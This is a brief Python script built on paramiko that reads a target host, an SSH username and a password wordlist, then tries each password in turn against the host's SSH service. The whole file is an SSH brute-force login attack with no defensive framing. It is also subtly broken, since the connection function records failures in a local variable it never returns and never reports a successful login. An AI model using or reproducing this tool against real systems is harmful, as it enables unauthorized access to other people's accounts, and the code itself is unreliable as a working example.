import paramiko
import sys
import os
import socket
import termcolor


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Input File: ')

if not os.path.exists(input_file):
    print('Input File does not exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            ssh_connect(password)
        except:
            pass
